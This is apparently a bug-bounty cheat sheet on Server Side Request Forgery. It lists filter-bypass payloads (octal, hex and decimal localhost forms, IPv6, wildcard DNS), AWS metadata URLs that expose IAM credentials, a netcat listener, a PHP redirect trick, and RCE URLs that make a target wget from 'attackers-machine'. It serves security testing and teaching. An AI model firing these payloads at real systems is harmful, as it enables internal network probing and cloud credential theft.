---
description: Server Side Request Forgery
---

# SSRF

Comes in many forms, each time it appears is almost a unique occurence, dependent on the site's functionality and implementation.  SSRF unintentionally gives the user the ability to do something and appear as though it is the server making that request.  If you have control over a URL parameter and it isn't a redirect, you should test for SSRF.  Some more common occurences are making requests to an API \(internal or external\), exposing their internal network through port scans or accessing files on their local networks. 

Take a look at out-of-band mechanisms `(ssrftest.com)` and burp's collaborater.  Set up a netcat lister via `nc -l -n -vv -p 8080 -k`

If you receive an error message back, check to see if there's a way to tell the difference between open and closed ports. If not, maybe the amount of time it takes to get a response may give you a hint \(burp's Intruder is built for this\). 

Often this only works with certain ports, so test 80, 443, 8080, 8443, 8001, etc..

If you have an endpoint that appends a path to your payload, try adding a & or a \# to the end of your payload like so:

[`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000&`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000&)[`http://internal-vulnerable-server/rce?cmd=wget attackers-machine:4000#`](http://internal-vulnerable-server/rce?cmd=wget%20attackers-machine:4000#)

If there's a parser looking for a specific IP address, try decimal IP notation.

Take a look into a web app's PDF generators, document parsers and file uploads, as SSRF may occur there.  You can simplify the confirmation of the vulnerability without exposing your private IP by using webhooks \(webhook.site\).  

**Port scanning internal assets**  


```text
http://0177.1/
```

```text
http://0x7f.1/
```

```text
http://127.000.000.1
```

```text
https://520968996
```

_Note:_ The latter can be calculated using [http://www.subnetmask.info/](http://www.subnetmask.info/)

**Exotic Handlers**

```text
gopher://, dict://, php://, jar://, tftp://
```

**IPv6**

```text
http://[::1]
```

```text
http://[::]
```

**Wildcard DNS**

```text
10.0.0.1.xip.io
www.10.0.0.1.xip.io
mysite.10.0.0.1.xip.io
foo.bar.10.0.0.1.xip.io
```

_Link:_ [http://xip.io](http://xip.io)

```text
10.0.0.1.nip.io
app.10.0.0.1.nip.io
customer1.app.10.0.0.1.nip.io
customer2.app.10.0.0.1.nip.io
otherapp.10.0.0.1.nip.io
```

_Link:_ [http://nip.io](http://nip.io)

**AWS EC2 Metadata**

```text
http://169.254.169.254/latest/meta-data/
```

```text
http://169.254.169.254/latest/meta-data/local-hostname
```

```text
http://169.254.169.254/latest/meta-data/public-hostname
```

> If there is an IAM role associated with the instance, role-name is the name of the role, and role-name contains the temporary security credentials associated with the role \[...\]

_Link:_ [http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html) \(includes a comprehensive Instance Metadata Categories table\)

Create index.php with the following:

&lt;?php header\("location: [http://burp.collab.server](http://burp.collab.server)"\); ?&gt; 

Host it \(but be careful in doing this as it does introduce a security vulnerability on the system you're on\): `sudo php -S :80 -t`  Specify your host for the target site in the vulnerable application

This has a great write-up on SOP and CORS, as well as SSRF: _https://www.bishopfox.com/blog/2015/04/vulnerable-by-design-understanding-server-side-request-forgery/_ 

**Bug Bounty Write-ups:**   
[https://hackerone.com/reports/508459](https://hackerone.com/reports/508459)  
[https://hackerone.com/reports/541169](https://hackerone.com/reports/541169)   
[https://hackerone.com/reports/115748](https://hackerone.com/reports/115748)   
[https://hackerone.com/reports/301924](https://hackerone.com/reports/301924)   
[https://www.sxcurity.pro/hackertarget/](https://www.sxcurity.pro/hackertarget/)   
[http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html](http://blog.orange.tw/2017/07/how-i-chained-4-vulnerabilities-on.html)   
[https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf](https://seanmelia.files.wordpress.com/2016/07/ssrf-to-pivot-internal-networks.pdf) [https://github.com/ngalongc/bug-bounty-reference\#server-side-request-forgery-ssrf](https://github.com/ngalongc/bug-bounty-reference#server-side-request-forgery-ssrf) [https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/](https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/) 

**Payloads:** [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SSRF) injection 

**RESOURCES**   
[http://resources.infosecinstitute.com/the-ssrf-vulnerability/\#gref](http://resources.infosecinstitute.com/the-ssrf-vulnerability/#gref) [http://blog.safebuff.com/2016/07/03/SSRF-Tips/](http://blog.safebuff.com/2016/07/03/SSRF-Tips/)   
https://medium.com/@vickieli/bypassing-ssrf-protection-e111ae70727b   
[https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF](https://www.hackerone.com/blog-How-To-Server-Side-Request-Forgery-SSRF) [https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/](https://www.acunetix.com/blog/articles/server-side-request-forgery-vulnerability/) [https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/](https://securingtomorrow.mcafee.com/mcafee-labs/server-side-request-forgery-takes-advantage-vulnerable-app-servers/) [https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/](https://hack-ed.net/2017/11/07/a-nifty-ssrf-bug-bounty-write-up/)

